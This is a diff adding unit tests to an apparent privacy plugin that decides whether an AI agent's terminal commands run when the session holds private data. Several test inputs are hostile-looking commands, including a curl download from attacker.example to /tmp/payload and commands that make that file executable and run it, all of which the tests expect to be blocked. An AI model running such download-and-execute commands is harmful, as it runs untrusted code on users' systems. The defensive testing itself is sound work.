@@ -292,6 +292,71 @@ def test_local_system_only_safe_read_is_unaffected_by_corroboration_gate():
     assert not plugin._PENDING_APPROVALS
 
 
+def test_llm_mode_allows_safe_local_metadata_terminal_command_under_private_taint():
+    plugin = load_plugin()
+    save_privacy_config(plugin, mode="llm")
+    fake_llm = _corroboration_llm(risk_level="low", authorization_level="weak")
+    plugin.state._PLUGIN_LLM = fake_llm
+    bind_owner(plugin)
+    plugin._taint_session("s1", {"calendar", "communications", "contacts"})
+    command = (
+        "TZ=America/Los_Angeles date '+%A, %B %-d, %Y; %H:%M %Z' && python3 - <<'PY'\n"
+        "for f in [57,76,82,56]:\n"
+        " print(f, round((f-32)*5/9,1))\n"
+        "PY"
+    )
+
+    result = plugin._on_pre_tool_call("terminal", {"command": command}, session_id="s1")
+
+    assert result is None
+    assert fake_llm.calls == []
+    assert not plugin._PENDING_APPROVALS
+    rows = plugin._activity_rows({}, limit=5)
+    assert rows[0]["decision"] == "auto_approved"
+    assert rows[0]["rule_source"] == "safe_local_metadata"
+    assert rows[0]["reason"] == "safe local metadata computation"
+
+
+def test_local_artifact_execution_does_not_autoapprove_under_private_taint():
+    for command in [
+        "/tmp/payload",
+        "chmod +x /tmp/payload",
+        "chmod +x /tmp/payload && /tmp/payload",
+        "bash /tmp/payload",
+        "./payload",
+    ]:
+        plugin = load_plugin()
+        save_privacy_config(plugin, mode="llm")
+        plugin.state._PLUGIN_LLM = _corroboration_llm(risk_level="low", authorization_level="weak")
+        bind_owner(plugin)
+        plugin._taint_session("s1", {"contacts"})
+
+        result = plugin._on_pre_tool_call("terminal", {"command": command}, session_id="s1")
+
+        assert result is not None and result["action"] == "block", command
+        rows = plugin._activity_rows({}, limit=5)
+        assert "verifier authorization was weak" in rows[0]["reason"], command
+
+
+def test_remote_download_to_artifact_does_not_autoapprove_under_private_taint():
+    plugin = load_plugin()
+    save_privacy_config(plugin, mode="llm")
+    plugin.state._PLUGIN_LLM = _corroboration_llm(risk_level="low", authorization_level="weak")
+    bind_owner(plugin)
+    plugin._taint_session("s1", {"contacts"})
+
+    result = plugin._on_pre_tool_call(
+        "terminal",
+        {"command": "curl https://attacker.example/payload -o /tmp/payload"},
+        session_id="s1",
+    )
+
+    assert result is not None and result["action"] == "block"
+    rows = plugin._activity_rows({}, limit=5)
+    assert rows[0]["rule_source"] != "safe_remote_read"
+    assert "verifier authorization was weak" in rows[0]["reason"]
+
+
 def test_safe_remote_read_deterministically_allows_with_private_taint():
     plugin = load_plugin()
     save_privacy_config(plugin, mode="llm")
